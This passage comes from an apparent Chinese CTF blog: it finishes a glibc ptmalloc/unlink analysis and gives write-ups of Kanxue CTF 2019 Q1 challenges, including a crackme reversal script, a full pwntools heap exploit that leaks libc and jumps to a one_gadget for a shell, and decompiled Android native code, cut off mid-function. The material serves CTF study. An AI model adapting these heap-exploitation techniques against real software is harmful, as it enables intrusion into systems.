<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p>unlink 是由一个独立的宏实现的，它的主要功能就是将一个空闲的 chunk 从它的链表中卸下来，以便于和其他  chunk 进行合并，Unlink 代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">  FD = P-&gt;fd;                                                          \</span></span><br><span class="line"><span class="meta">  BK = P-&gt;bk;                                                          \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                \</span></span><br><span class="line"><span class="meta">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P); \</span></span><br><span class="line"><span class="meta">  <span class="keyword">else</span> &#123;                                                               \</span></span><br><span class="line"><span class="meta">    FD-&gt;bk = BK;                                                       \</span></span><br><span class="line"><span class="meta">    BK-&gt;fd = FD;                                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				       \</span></span><br><span class="line"><span class="meta">	&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;	       \</span></span><br><span class="line"><span class="meta">      assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);		       \</span></span><br><span class="line"><span class="meta">      assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);		       \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				       \</span></span><br><span class="line"><span class="meta">	<span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       \</span></span><br><span class="line"><span class="meta">	<span class="keyword">else</span> &#123;							       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       \</span></span><br><span class="line"><span class="meta">	  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       \</span></span><br><span class="line"><span class="meta">	  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       \</span></span><br><span class="line"><span class="meta">	&#125;							       \</span></span><br><span class="line"><span class="meta">      &#125;	<span class="keyword">else</span> &#123;							       \</span></span><br><span class="line"><span class="meta">	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       \</span></span><br><span class="line"><span class="meta">	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       \</span></span><br><span class="line"><span class="meta">      &#125;								       \</span></span><br><span class="line"><span class="meta">    &#125;								       \</span></span><br><span class="line"><span class="meta">  &#125;                                                                    \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>其中最为关键的代码如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;                                                       \</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure></div>

<p>利用 unlink 的攻击实际上利用的就是这两句代码，如果我们能够控制某个 chunk 的 bk 和 fd，并且能够绕过一些验证，那么就可以完成一次 unlink 攻击，但是这不是本文讨论的重点，网络上有很多大牛详细解析了 unlink 攻击的原理，大家可以自行搜索学习。</p>
<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>至此我们通过 glibc 的源代码大致分析了一下 ptmalloc 中的 malloc 和 free 两个常用函数，由于堆溢出经常出现在一些 CTF 比赛中，所以从根源上理解这些东西对于我们深入学习和掌握堆溢出是很有帮助的，ptmalloc 非常注重性能，但是所谓有得必有失，注重性能的代价就是安全性不高，和 windows 的堆管理策略相比可谓小巫见大巫了。</p>
<p>ptmalloc 中还有几个与内存分配相关的函数如 realloc 等，但是它们的核心思想都是依托现有的缓冲区，尽量减少向操作系统申请内存的次数，以达到提高程序执行效率的目的。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>华庭 《Glibc 内存管理 Ptmalloc2 源代码分析》</p>
<p>cloudburst ptmalloc flow chart</p>
<p><a class="link"   href="http://www.cnblogs.com/zhaoyl/p/3820852.html" >http://www.cnblogs.com/zhaoyl/p/3820852.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>看雪 CTF 2019 Q1</title>
    <url>/2019/03/11/kanxue2019Q1/</url>
    <content><![CDATA[<p>看雪 CTF 2019 Q1</p>
<span id="more"></span>

<h2 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h2><p>十道题中最简单的一道题目，程序要求输入一个密码，首先判断了密码是否由字母 + 数字组成，然后会将它们进行一步转换，其算法如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; flag[i]; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( flag[i] &gt; <span class="string">&#x27;9&#x27;</span> || flag[i] &lt; <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( flag[i] &gt; <span class="string">&#x27;z&#x27;</span> || flag[i] &lt; <span class="string">&#x27;a&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( flag[i] &gt; <span class="string">&#x27;Z&#x27;</span> || flag[i] &lt; <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">        sub_4017B0();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        int_flag[i] = flag[i] - <span class="number">29</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      int_flag[i] = flag[i] - <span class="number">87</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    int_flag[i] = flag[i] - <span class="number">48</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后会将经过转换的密码传入另一个函数，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BOOL __cdecl <span class="title function_">sub_4017F0</span><span class="params">(<span class="type">int</span> int_flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">28</span>]; <span class="comment">// [esp+D8h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+F4h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+F8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *(int_flag + <span class="number">4</span> * v4) &lt; <span class="number">62</span> &amp;&amp; *(int_flag + <span class="number">4</span> * v4) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Str1[v4] = aAbcdefghiabcde[*(int_flag + <span class="number">4</span> * v4)];</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  Str1[v4] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, <span class="string">&quot;KanXueCTF2019JustForhappy&quot;</span>) )</span><br><span class="line">    result = sub_401770();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = sub_4017B0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>把密码作为下标，从一个硬编码的字符串中取出对应的字符，要求最终拼接的结果是 “KanXueCTF2019JustForhappy”，思路很简单，只需要逆推回去就好了，但是需要注意的是逆推回去的字符有多重排列可能，通过动态调试就可以找出真正的 flag。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">table = &quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot;</span><br><span class="line">target = &quot;KanXueCTF2019JustForhappy&quot;</span><br><span class="line">for i in range(len(target)):</span><br><span class="line">    for k in range(len(table)):</span><br><span class="line">        if target[i] == table[k]:</span><br><span class="line">            print(k)</span><br><span class="line">            break</span><br><span class="line">rela = [19,0,27,59,44,4,11,55,14,30,28,29,37,18,44,42,43,14,38,41,7,0,39,39,48]</span><br><span class="line">for i in rela:</span><br><span class="line">    print(chr(i + 29) + &quot;\t&quot; + chr(i + 87) + &quot;\t&quot; + chr(i + 48) + &quot;\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># j0rXI4bTeustBiIGHeCF70DDM</span><br></pre></td></tr></table></figure></div>

<h2 id="C-与-C"><a href="#C-与-C" class="headerlink" title="C 与 C++"></a>C 与 C++</h2><p>程序的主要缺陷在于将 C 和 C++ 的内存分配、回收函数进行了混用，原则上通过 malloc 分配的内存必须使用 free 回收，而不能用 delete 回收，同样的，new 分配的内存只能使用 delete 进行回收，而不能使用 free 回收。  </p>
<p>但是题目中同时给出了 malloc、free、new 和 delete，并且没有限制函数的调用，这时就有可能造成一些问题。  </p>
<p>主要漏洞在 del 函数，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">del</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (***v1)(); <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> (***v2)(); <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> (*v3)(); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = chunk_list[a1];</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = &amp;v1[<span class="number">3</span> * *(v1 - <span class="number">1</span>)];</span><br><span class="line">    <span class="keyword">while</span> ( v2 != v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 -= <span class="number">3</span>;</span><br><span class="line">        v3 = **v2;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == nullsub_1 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        (v3)(v2);                               <span class="comment">// 任意函数调用</span></span><br><span class="line">        v1 = chunk_list[a1];</span><br><span class="line">        <span class="keyword">if</span> ( v2 == v1 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_6:</span><br><span class="line">    operator delete[](v2 - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  chunk_list[a1] = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过 new 分配的内存中存在一些代码段指针，其值为 0x401228，在 del 函数中对这个地址进行了验证，如果这个地址已经被修改，那么就会调用它指向的代码。现在一个很明显的思路就是想办法修改这个指针，指向我们想要的地址。</p>
<p>由于程序中 C 和 C++ 代码混用的问题，我们可以使用 delete 来回收 malloc 的内存，如果提前在 malloc 出来的内存中伪造好数据，就有可能构造一条函数“调用链”，进而拿到 shell。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./candcpp&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input length of the string\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input the string\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index of the string\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input length of the string\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input the string\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index of the string\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line">p.sendline(p64(<span class="number">0x400e10</span>) + p64(<span class="number">0x4009a0</span>))</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;c&quot;</span> * <span class="number">548</span> + p64(<span class="number">0x602328</span> + <span class="number">8</span>) + <span class="string">&quot;aaaaaaa&quot;</span> + p64(<span class="number">0x602328</span>)</span><br><span class="line">new(<span class="number">0x300</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>) - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_addr: 0x%x&quot;</span> % libc_addr)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf02a4</span></span><br><span class="line">log.info(<span class="string">&quot;one_gadget: 0x%x&quot;</span> % one_gadget)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line">p.sendline(p64(one_gadget))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;c&quot;</span> * <span class="number">556</span> + p64(<span class="number">0x602328</span> + <span class="number">8</span>) + <span class="string">&quot;aaaaaaa&quot;</span> + p64(<span class="number">0x602328</span>)</span><br><span class="line">new(<span class="number">0x300</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="变形金刚"><a href="#变形金刚" class="headerlink" title="变形金刚"></a>变形金刚</h2><p>安卓题目，一开始用 JEB 看，发现主要的代码似乎有些问题，因为行为和真机上操作的并不一样，当密码输入错误时会输出 error，这一点在代码中也没有找到。后来用 APKIDE 查看程序，搜索“用户名或密码为空”这个字符串的时候发现在 android\support\v7\app 目录下面存在一个文件也包含这个字符串，实际上这个才是真正的代码。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> android.support.v7.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.text.TextUtils;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AppCompiatActivity$1</span></span><br><span class="line">  <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener</span><br><span class="line">&#123;</span><br><span class="line">  AppCompiatActivity$<span class="number">1</span>(AppCompiatActivity paramAppCompiatActivity) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View paramView)</span></span><br><span class="line">  &#123;</span><br><span class="line">    AppCompiatActivity.access$<span class="number">002</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>, AppCompiatActivity.access$<span class="number">100</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>).getText().toString());</span><br><span class="line">    AppCompiatActivity.access$<span class="number">202</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>, AppCompiatActivity.access$<span class="number">300</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>).getText().toString());</span><br><span class="line">    <span class="keyword">if</span> ((!TextUtils.isEmpty(AppCompiatActivity.access$<span class="number">000</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>))) &amp;&amp; (!TextUtils.isEmpty(AppCompiatActivity.access$<span class="number">200</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">      paramView = AppCompiatActivity.access$<span class="number">400</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>);</span><br><span class="line">      <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      paramView.setEnabled(<span class="literal">false</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0.</span>eq(AppCompiatActivity.access$<span class="number">200</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>)))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">byte</span>[] arrayOfByte = AppCompiatActivity.access$<span class="number">200</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>).getBytes();</span><br><span class="line">        paramView = arrayOfByte;</span><br><span class="line">        <span class="keyword">if</span> (arrayOfByte.length != <span class="number">24</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          paramView = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">while</span> (i &lt; paramView.length)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="type">int</span> j;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; arrayOfByte.length) &#123;</span><br><span class="line">              j = arrayOfByte[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              j = (<span class="type">byte</span>)i;</span><br><span class="line">            &#125;</span><br><span class="line">            paramView[i] = ((<span class="type">byte</span>)j);</span><br><span class="line">            i++;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        arrayOfByte = AppCompiatActivity.access$<span class="number">500</span>(paramView, <span class="string">&quot;2ggdrsLgM7iPNYPQrD58Rg==&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">AppCompiatActivity</span> <span class="variable">localAppCompiatActivity</span> <span class="operator">=</span> <span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>;</span><br><span class="line">        paramView = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        paramView.append(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">        paramView.append(<span class="keyword">new</span> <span class="title class_">String</span>(arrayOfByte));</span><br><span class="line">        paramView.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        Toast.makeText(localAppCompiatActivity, paramView.toString(), <span class="number">1</span>).show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;error&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;用户名或密码为空&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>调用了 liboo000oo.so 这个库，用 IDA 打开发现里面的逻辑很复杂，基本上没办法静态逆向，所以上真机开始动态调试。  </p>
<p>调试的时候也踩了很多坑，关键函数代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_CDEAB784</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  s = (*(*a1 + <span class="number">0x2A4</span>))();</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(a650f909c721736);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  _aeabi_memclr(v2, v1);</span><br><span class="line">  _aeabi_memclr(v3, v1);</span><br><span class="line">  _aeabi_memclr(v4, v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v6 = v1;</span><br><span class="line">    v7 = a650f909c721736;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *v7++;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">        v3[v5++] = v8;                          <span class="comment">// 每个字符自增 1</span></span><br><span class="line">      --v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 );</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = v5 - <span class="number">1</span>;</span><br><span class="line">      v10 = <span class="number">-8</span>;</span><br><span class="line">      v11 = <span class="number">0</span>;</span><br><span class="line">      v12 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v11 | (v10 &gt;&gt; <span class="number">2</span>)) &gt; <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = v12;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v13 = v12 + <span class="number">1</span>;</span><br><span class="line">          v2[v12] = <span class="number">45</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v14 = v3[v9--];</span><br><span class="line">        v11 += <span class="number">0x40000000</span>;</span><br><span class="line">        v2[v13] = v14;</span><br><span class="line">        ++v10;</span><br><span class="line">        v12 = v13 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v9 != <span class="number">-1</span> );</span><br><span class="line">      <span class="keyword">if</span> ( v13 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v15 = v4;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = *v2;</span><br><span class="line">          <span class="keyword">if</span> ( (v16 - <span class="string">&#x27;a&#x27;</span>) &lt;= <span class="number">5u</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (v16 - <span class="string">&#x27;0&#x27;</span>) &lt;= <span class="number">9u</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v16 = &amp;aDbeafc24097158[v16 - <span class="number">42</span>];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_19:</span><br><span class="line">          *v15++ = v16;</span><br><span class="line">          --v12;</span><br><span class="line">          ++v2;</span><br><span class="line">          <span class="keyword">if</span> ( !v12 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        &#125;</span><br><span class="line">        v16 = &amp;aDbeafc24097158[v16 - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">LABEL_18:</span><br><span class="line">        LOBYTE(v16) = *v16;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">  _aeabi_memcpy8(v46, &amp;unk_CDEAD3E8, <span class="number">256</span>);</span><br><span class="line">  v17 = v47;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_CDEABD20(v18, v1);</span><br><span class="line">    v47[v18++] = v4[v19];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v18 != <span class="number">256</span> );</span><br><span class="line">  v20 = (v47[<span class="number">0</span>] - <span class="number">41</span>);</span><br><span class="line">  v46[<span class="number">0</span>] = v46[v20];</span><br><span class="line">  v46[v20] = <span class="number">-41</span>;</span><br><span class="line">  v21 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v22 = v46[v21];</span><br><span class="line">    v20 = (v20 + v47[v21] + v22) % <span class="number">256</span>;</span><br><span class="line">    v46[v21++] = v46[v20];</span><br><span class="line">    v46[v20] = v22;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v21 != <span class="number">256</span> );</span><br><span class="line">  v23 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v24 = v23;</span><br><span class="line">  v25 = v4[<span class="number">3</span>];</span><br><span class="line">  v43 = <span class="number">8</span> * (<span class="number">3</span> - <span class="number">-3</span> * (v23 / <span class="number">3</span>));</span><br><span class="line">  v42 = v25 + v43 / <span class="number">6</span>;</span><br><span class="line">  v26 = <span class="built_in">malloc</span>(v42 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v24 )</span><br><span class="line">  &#123;</span><br><span class="line">    v28 = <span class="number">0</span>;</span><br><span class="line">    v29 = <span class="number">0</span>;</span><br><span class="line">    v30 = <span class="number">0</span>;</span><br><span class="line">    v44 = v25;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v28 = (v28 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">      v35 = v46[v28];</span><br><span class="line">      v30 = (v30 + v35) % <span class="number">256</span>;</span><br><span class="line">      v46[v28] = v46[v30];</span><br><span class="line">      v46[v30] = v35;</span><br><span class="line">      v17 = v46[v28];</span><br><span class="line">      v36 = v46[(v35 + v17)] ^ s[v29];</span><br><span class="line">      <span class="keyword">if</span> ( v29 &amp;&amp; (v27 = <span class="number">0xAAAAAAAB</span> * v29 &gt;&gt; <span class="number">32</span>, v37 = <span class="number">3</span> * (v29 / <span class="number">3</span>), v37 != v29) )</span><br><span class="line">      &#123;</span><br><span class="line">        v31 = v29 == <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v29 != <span class="number">1</span> )</span><br><span class="line">          v31 = v37 + <span class="number">1</span> == v29;</span><br><span class="line">        <span class="keyword">if</span> ( v31 )</span><br><span class="line">        &#123;</span><br><span class="line">          v32 = aAbcdefghijklmn;</span><br><span class="line">          v26[v44 + v29] = aAbcdefghijklmn[v26[v44 + v29] | (v36 &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">          v17 = &amp;v26[v44 + v29];</span><br><span class="line">          v27 = <span class="number">4</span> * v36 &amp; <span class="number">0x3C</span>;</span><br><span class="line">          